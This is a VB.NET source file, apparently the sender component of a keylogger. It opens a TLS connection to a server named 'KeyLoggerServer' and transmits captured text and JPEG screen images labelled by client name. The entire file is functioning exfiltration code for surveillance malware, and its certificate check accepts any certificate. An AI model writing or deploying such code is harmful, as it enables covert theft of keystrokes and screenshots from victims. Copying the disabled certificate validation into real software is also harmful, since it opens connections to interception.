Imports System
Imports System.Text
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.IO
Imports System.Security.Cryptography
Imports System.Net.Security
Imports System.Security.Cryptography.X509Certificates

Namespace SocketClient
    Public Class ClientSend
        Public tcpThread As Thread
        Public IsConnected As Boolean
        Public Clientname As String

        Public Server As String = "localhost"
        Public Port As Integer = 2000
        Dim client As TcpClient
        Dim netStream As NetworkStream
        Dim ssl As SslStream
        Dim bw As BinaryWriter
        Public Const IM_Text As Byte = 1    '// Message text
        Public Const IM_Img As Byte = 2    '// Message image

        Sub Connect()
            If (IsConnected = False) Then
                IsConnected = True
                client = New TcpClient(Server, Port)  '// Connect to the server.
                netStream = client.GetStream()
                ssl = New SslStream(netStream, False, New RemoteCertificateValidationCallback(AddressOf ValidateCert))
                ssl.AuthenticateAsClient("KeyLoggerServer")
                bw = New BinaryWriter(ssl) 'ssl, Encoding.UTF8)
            End If
        End Sub
        Sub SentText(ClName As String, fileName As String, Txt As String)  '// Sent all incoming packets.
            Try
                Dim a() As Byte, b() As Byte
                ' Loai du lieu
                'bw.Write(1)
                'bw.Flush()
                ' Length ten thu muc/filename - client/filename
                a = UnicodeEncoding.UTF8.GetBytes(Left(ClName, 250))
                bw.Write(CByte(a.Length))
                'bw.Flush()

                b = UnicodeEncoding.UTF8.GetBytes(Left(fileName, 250))
                bw.Write(CByte(b.Length))
                'bw.Flush()

                bw.Write(a)
                'bw.Flush()
                bw.Write(b)
                'bw.Flush()

                bw.Write(UnicodeEncoding.UTF8.GetBytes(Txt))
                bw.Flush()
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        End Sub
        Sub SentImage(ClName As String, fileName As String, obj As Image)  '// Sent all incoming packets.
            Try
                Dim a() As Byte, b() As Byte
                Dim ms As New MemoryStream
                'Dim br As BinaryReader
                ' Loai du lieu
                'bw.Write(2)
                'bw.Flush()
                ' Length ten thu muc/filename - client/filename
                a = UnicodeEncoding.UTF8.GetBytes(Left(ClName, 250))
                bw.Write(CByte(a.Length))
                bw.Flush()
                b = UnicodeEncoding.UTF8.GetBytes(Left(fileName, 250))
                bw.Write(CByte(b.Length))
                bw.Flush()
                bw.Write(a)
                bw.Flush()
                bw.Write(b)
                bw.Flush()
                obj.Save(ms, Imaging.ImageFormat.Jpeg)
                'br = New BinaryReader(ms)
                Dim filedata(ms.Length) As Byte
                filedata = ms.GetBuffer()
                'br.Read(filedata, 0, ms.Length)
                bw.Write(filedata)
                bw.Flush()
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        End Sub
        Sub Disconnect()
            If (IsConnected = True) Then
                IsConnected = False
                bw.Close()
                netStream.Close()
                client.Close()
            End If
        End Sub
        Function ValidateCert(sender As Object, certificate As X509Certificate, chain As X509Chain, sslPolicyErrors As SslPolicyErrors)
            Return True
        End Function
    End Class
End Namespace

